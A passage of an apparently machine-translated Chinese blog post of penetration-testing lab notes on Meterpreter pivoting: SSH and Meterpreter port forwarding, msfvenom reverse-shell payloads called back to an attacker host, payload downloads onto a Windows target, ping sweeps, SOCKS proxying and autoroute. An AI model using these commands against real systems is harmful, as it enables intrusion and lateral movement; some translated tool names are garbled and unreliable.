+<h4 id="Starting-Python3-Webserver-on-Pivot-Host"><a href="#Starting-Python3-Webserver-on-Pivot-Host" class="headerlink" title="Starting Python3 Webserver on Pivot Host"></a>Starting Python3 Webserver on Pivot Host</h4><pre><code class="shell-session">ubuntu@Webserver$ python3 -m http.server 8123
+</code></pre>
+<h4 id="Downloading-Payload-from-Windows-Target"><a href="#Downloading-Payload-from-Windows-Target" class="headerlink" title="Downloading Payload from Windows Target"></a>Downloading Payload from Windows Target</h4><p>我们可以通过web浏览器或PowerShell cmdlet Invoke-WebRequest从Windows主机下载此备份脚本.exe。</p>
+<pre><code class="powershell-session">PS C:\Windows\system32&gt; Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;
+</code></pre>
+<p>一旦我们在Windows主机上下载了负载，我们将使用SSH远程端口转发将msfconsole在8000端口上的侦听器服务转发到Ubuntu服务器的8080端口。我们将在SSH命令中使用-vN参数，使其变得详细，并要求它不要提示登录shell。-R命令要求Ubuntu服务器侦听<targetIPaddress>:8080，并将端口8080上的所有传入连接转发到我们攻击主机0.0.0.0:8000上的msfconsole侦听器。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:8000 ubuntu@&lt;ipAddressofTarget&gt; -vN
+</code></pre>
+<p>在创建SSH远程端口转发后，我们可以从Windows目标执行负载。如果有效负载按预期执行并尝试连接回侦听器，我们可以在pivot主机上看到来自pivot的日志。</p>
+<p>如果一切设置正确，我们将通过Ubuntu服务器收到一个Meterpeter shell。</p>
+<h4 id="Meterpreter-Session-Established"><a href="#Meterpreter-Session-Established" class="headerlink" title="Meterpreter Session Established"></a>Meterpreter Session Established</h4><pre><code class="shell-session">[*] Started HTTPS reverse handler on https://0.0.0.0:8000
+[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
+[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
+[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
+[*] Meterpreter session 1 opened (127.0.0.1:8000 -&gt; 127.0.0.1 ) at 2022-03-02 10:48:10 -0500
+
+meterpreter &gt; shell
+Process 3236 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\&gt;
+</code></pre>
+<p>Meterpeter会话应该列出我们的传入连接来自本地主机本身（127.0.0.1），因为我们通过本地SSH套接字接收连接，该套接字创建了到Ubuntu服务器的出站连接。发出netstat命令可以向我们显示传入连接来自SSH服务。 下面的图形表示提供了理解该技术的另一种方式。</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308291516188.png" alt="img"></p>
+<pre><code class="powershell-session"> Invoke-WebRequest -Uri &quot;http://10.129.147.31:8123/backdoor.exe&quot; -OutFile &quot;C:\backdoor&quot;
+</code></pre>
+<h1 id="Meterpreter-Tunneling-amp-Port-Forwarding"><a href="#Meterpreter-Tunneling-amp-Port-Forwarding" class="headerlink" title="Meterpreter Tunneling &amp; Port Forwarding"></a>Meterpreter Tunneling &amp; Port Forwarding</h1><h4 id="Creating-Payload-for-Ubuntu-Pivot-Host"><a href="#Creating-Payload-for-Ubuntu-Pivot-Host" class="headerlink" title="Creating Payload for Ubuntu Pivot Host"></a>Creating Payload for Ubuntu Pivot Host</h4><pre><code class="shell-session">Tanin@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+</code></pre>
+<p>在复制有效负载之前，我们可以启动一个 <a target="_blank" rel="noopener" href="https://www.rapid7.com/db/modules/exploit/multi/handler/">multi&#x2F;handler</a>，也称为GenericPayloadHandler。</p>
+<pre><code class="shell-session">msf6 &gt; use exploit/multi/handler
+</code></pre>
+<p>我们可以通过SSH将备份作业二进制文件复制到Ubuntu pivot主机，并执行它以获得Meterpeter会话。</p>
+<p>我们需要确保在执行有效载荷时成功建立MeterMeter会话。</p>
+<h4 id="Meterpreter-Session-Establishment"><a href="#Meterpreter-Session-Establishment" class="headerlink" title="Meterpreter Session Establishment"></a>Meterpreter Session Establishment</h4><p>我们知道Windows目标位于172.16.5.0&#x2F;23网络上。因此，假设Windows目标上的防火墙允许ICMP请求，我们希望在此网络上执行ping扫描。我们可以使用带有ping_sweep模块的Meterpeter来实现这一点，该模块将生成从Ubuntu主机到网络的ICMP流量172.16.5.0&#x2F;23。</p>
+<h4 id="Ping-Sweep"><a href="#Ping-Sweep" class="headerlink" title="Ping Sweep"></a>Ping Sweep</h4><pre><code class="shell-session">meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+
+[*] Performing ping sweep for IP range 172.16.5.0/23
+</code></pre>
+<p>我们还可以直接在目标枢轴主机上使用for循环执行ping扫描，该主机将ping我们指定的网络范围内的任何设备。这里有两个有用的ping扫描循环一行，我们可以用于基于Linux和基于Windows的枢轴主机。</p>
+<pre><code class="shell-session">for i in &#123;1..254&#125; ;do (ping -c 1 172.16.5.$i | grep &quot;bytes from&quot; &amp;) ;done
+</code></pre>
+<pre><code class="cmd-session">for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find &quot;Reply&quot;
+</code></pre>
+<pre><code class="powershell-session">1..254 | % &#123;&quot;172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)&quot;&#125;
+</code></pre>
+<p>注意：ping扫描可能不会在第一次尝试时成功回复，尤其是在跨网络通信时。这可能是由主机构建其arp缓存所需的时间造成的。在这些情况下，最好尝试至少两次ping扫描，以确保构建arp缓存。</p>
+<p>在某些情况下，主机的防火墙会阻止ping（ICMP），而ping不会成功回复我们。在这些情况下，我们可以使用Nmap在172.16.5.0&#x2F;23网络上执行TCP扫描。我们还可以使用Metasploit的漏洞利用后路由模块socks_proxy在攻击主机上配置本地代理，而不是使用SSH进行端口转发。我们将为SOCKS版本4a配置SOCKS代理。此SOCKS配置将在端口9050上启动一个侦听器，并路由通过MeterMeter会话接收的所有流量。</p>
+<h4 id="Configuring-MSF’s-SOCKS-Proxy"><a href="#Configuring-MSF’s-SOCKS-Proxy" class="headerlink" title="Configuring MSF’s SOCKS Proxy"></a>Configuring MSF’s SOCKS Proxy</h4><pre><code class="shell-session">msf6 &gt; use auxiliary/server/socks_proxy
+</code></pre>
+<pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050
+SRVPORT =&gt; 9050
+msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0
+SRVHOST =&gt; 0.0.0.0
+msf6 auxiliary(server/socks_proxy) &gt; set version 4a
+version =&gt; 4a
+msf6 auxiliary(server/socks_proxy) &gt; run
+[*] Auxiliary module running as background job 0.
+
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) &gt; options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  9050             yes       The port to listen on
+   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
+                                        5)
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+</code></pre>
+<h4 id="Confirming-Proxy-Server-is-Running"><a href="#Confirming-Proxy-Server-is-Running" class="headerlink" title="Confirming Proxy Server is Running"></a>Confirming Proxy Server is Running</h4><pre><code class="shell-session">msf6 auxiliary(server/socks_proxy) &gt; jobs
+
+Jobs
+====
+
+  Id  Name                           Payload  Payload opts
+  --  ----                           -------  ------------
+  0   Auxiliary: server/socks_proxy
+</code></pre>
+<p>在启动SOCKS服务器后，我们将配置proxychans，通过我们在受损的Ubuntu主机上的枢轴来路由其他工具（如Nmap）生成的流量。如果还没有，我们可以在&#x2F;etc&#x2F;proxychain.conf的proxychain.onf文件的末尾添加以下行。</p>
+<pre><code class="shell-session">socks4 	127.0.0.1 9050
+</code></pre>
+<p>注意：根据SOCKS服务器运行的版本，我们可能偶尔需要在proxyains.conf中将socks4更改为socks5。</p>
+<h4 id="Creating-Routes-with-AutoRoute"><a href="#Creating-Routes-with-AutoRoute" class="headerlink" title="Creating Routes with AutoRoute"></a>Creating Routes with AutoRoute</h4><pre><code class="shell-session">msf6 &gt; use post/multi/manage/autoroute
+
+msf6 post(multi/manage/autoroute) &gt; set SESSION 1
+SESSION =&gt; 1
+msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0
+SUBNET =&gt; 172.16.5.0
+msf6 post(multi/manage/autoroute) &gt; run
+</code></pre>
+<p>也可以通过从MeterMeter会话运行自动路由来添加具有自动路由的路由。</p>
+<pre><code class="shell-session">meterpreter &gt; run autoroute -s 172.16.5.0/23
+</code></pre>
+<p>添加必要的路由后，我们可以使用-p选项列出活动路由，以确保我们的配置按预期应用。</p>
+<pre><code class="shell-session">meterpreter &gt; run autoroute -p
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+
+Active Routing Table
+====================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.129.0.0         255.255.0.0        Session 1
+   172.16.4.0         255.255.254.0      Session 1
+   172.16.5.0         255.255.254.0      Session 1
+</code></pre>
+<p>从上面的输出中可以看出，该路由已添加到172.16.5.0&#x2F;23网络中。我们现在可以使用proxychans通过MeterMeter会话路由我们的Nmap流量。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+</code></pre>
+<h2 id="Port-Forwarding"><a href="#Port-Forwarding" class="headerlink" title="Port Forwarding"></a>Port Forwarding</h2><p>端口转发也可以使用Meterpeter的portfwd模块来完成。我们可以在我们的攻击主机上启用侦听器，并请求Meterpeter通过Metermeter会话将在该端口上接收到的所有数据包转发到172.16.5.0&#x2F;23网络上的远程主机。</p>
+<pre><code class="shell-session">meterpreter &gt; help portfwd
+
+Usage: portfwd [-h] [add | delete | list | flush] [args]
+
+
+OPTIONS:
+</code></pre>
+<h4 id="Creating-Local-TCP-Relay"><a href="#Creating-Local-TCP-Relay" class="headerlink" title="Creating Local TCP Relay"></a>Creating Local TCP Relay</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19
+</code></pre>
+<p>上述命令请求Metereter会话在我们的攻击主机的本地端口（-l）3300上启动一个侦听器，并通过我们的Meter会话将所有数据包转发到3389端口（-p）上的远程（-r）Windows服务器172.16.5.19。现在，如果我们在localhost:3300上执行xfreerdp，我们将能够创建一个远程桌面会话。</p>
+<h4 id="Connecting-to-Windows-Target-through-localhost"><a href="#Connecting-to-Windows-Target-through-localhost" class="headerlink" title="Connecting to Windows Target through localhost"></a>Connecting to Windows Target through localhost</h4><pre><code class="shell-session">Tanin@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+</code></pre>
+<h4 id="Netstat-Output"><a href="#Netstat-Output" class="headerlink" title="Netstat Output"></a>Netstat Output</h4><p>我们可以使用Netstat来查看有关我们最近建立的会话的信息。从防御的角度来看，如果我们怀疑主机被破坏，我们可能会从使用Netstat中受益。这使我们能够查看主机建立的任何会话。</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ netstat -antp
+
+tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
+</code></pre>
+<hr>
+<h2 id="Meterpreter-Reverse-Port-Forwarding"><a href="#Meterpreter-Reverse-Port-Forwarding" class="headerlink" title="Meterpreter Reverse Port Forwarding"></a>Meterpreter Reverse Port Forwarding</h2><p>与本地端口转发类似，Metasploit也可以使用以下命令执行反向端口转发，您可能希望监听受损服务器上的特定端口，并将所有来自Ubuntu服务器的shell转发到我们的攻击主机。我们将在Windows攻击主机的新端口上启动一个侦听器，并请求Ubuntu服务器将在端口1234上接收到的所有请求转发到我们在端口8081上的侦听器。 我们可以使用下面的命令在前面的场景中的现有shell上创建反向端口转发。该命令将Ubuntu服务器上运行的1234端口上的所有连接转发到本地端口（-l）8081上的攻击主机。我们还将配置我们的侦听器，以便在Windows外壳的8081端口上侦听。</p>
+<h4 id="Reverse-Port-Forwarding-Rules"><a href="#Reverse-Port-Forwarding-Rules" class="headerlink" title="Reverse Port Forwarding Rules"></a>Reverse Port Forwarding Rules</h4><pre><code class="shell-session">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
+[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234
+</code></pre>
+<h4 id="Configuring-amp-Starting-multi-x2F-handler"><a href="#Configuring-amp-Starting-multi-x2F-handler" class="headerlink" title="Configuring &amp; Starting multi&#x2F;handler"></a>Configuring &amp; Starting multi&#x2F;handler</h4><pre><code class="shell-session">meterpreter &gt; bg
+
+[*] Backgrounding session 1...
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp
+payload =&gt; windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LPORT 8081 
+LPORT =&gt; 8081
+msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0 
+LHOST =&gt; 0.0.0.0
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started reverse TCP handler on 0.0.0.0:8081 
+</code></pre>
+<p>我们现在可以创建一个反向shell负载，当在Windows主机上执行时，该负载将在172.16.5.129:1234上将连接发送回我们的Ubuntu服务器。一旦我们的Ubuntu服务器接收到这个连接，它就会转发这个连接来攻击我们配置的主机的ip:8081。</p>
+<h4 id="Establishing-the-Meterpreter-session"><a href="#Establishing-the-Meterpreter-session" class="headerlink" title="Establishing the Meterpreter session"></a>Establishing the Meterpreter session</h4><pre><code class="shell-session">[*] Started reverse TCP handler on 0.0.0.0:8081 
+[*] Sending stage (200262 bytes) to 10.10.14.18
+[*] Meterpreter session 2 opened (10.10.14.18:8081 -&gt; 10.10.14.18:40173 ) at 2022-03-04 15:26:14 -0500
+
+meterpreter &gt; shell
+Process 2336 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\&gt;
+</code></pre>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><em></em><a class="button is-default" href="/2023/08/24/command-injections/" title="command injections"><span class="has-text-weight-semibold">Next: command injections</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
